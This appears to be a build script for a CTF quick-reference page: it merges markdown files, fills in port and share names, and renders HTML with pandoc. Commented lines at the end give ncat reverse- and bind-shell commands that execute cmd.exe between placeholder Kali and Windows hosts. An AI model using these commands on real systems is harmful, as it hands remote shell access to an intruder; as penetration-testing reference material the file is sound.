#!/bin/bash
pwd="`pwd`"

http_port="80"
smb_share="share"

if [ $# -ge 1 ]; then
    http_port=$1
fi
if [ $# -ge 2 ]; then
    smb_share=$2
fi

echo ""
echo "Generating quick-ref with:"
echo " - Working Directory : $pwd"
echo " - HTTP Port         : $http_port"
echo " - SMB Share Name    : $smb_share"
echo ""

# Create combined Markdown file
echo "" > quickref.md; 
for i in _quickref/*_*.md; do 
  cat $i | \
    # ${pwd//\//\/} is replacing all / characters in path with \/
    sed "s/\$pwd/${pwd//\//\/}/g" | \
    #sed "s/\$target/$target/g" | \
    #sed "s/\$source_ip/$source_ip/g" | \
    #sed "s/\$source_port/$source_port/g" | \
    sed "s/\$http_port/$http_port/g" | \
    sed "s/\$smb_share/$smb_share/g" >> quickref.md; 
done

# Create HTML from the combined Markdown file
pandoc -f markdown -t html5 \
    -o quickref.html \
    --template _quickref/style/pandoc-toc-sidebar/toc-sidebar.html \
    -B _quickref/style/pandoc-toc-sidebar/nav \
    --toc --toc-depth=2 \
    -H _quickref/style/head.html \
    --css=_quickref/style/custom.css \
    --css=_quickref/style/dashboard.css \
    --metadata pagetitle="BriskSec - CTF Tools" \
    --standalone \
    --self-contained \
    quickref.md

URL="file://$pwd/quickref.html"
[[ -x $BROWSER ]] && exec "$BROWSER" "$URL"
path=$(which xdg-open || which gnome-open || which open) && exec "$path" "$URL"
echo "Can't find browser. Open $URL"

#Rev
#ncat -lnvp 4444 --allow [win ip] --ssl    # kali
#ncat -nv [kali ip] 4444 -e cmd.exe --ssl

#Bind
#ncat -lnvp 4444 -e cmd.exe --allow [kali ip] --ssl      # win
#ncat -nv [win ip] 4444 --ssl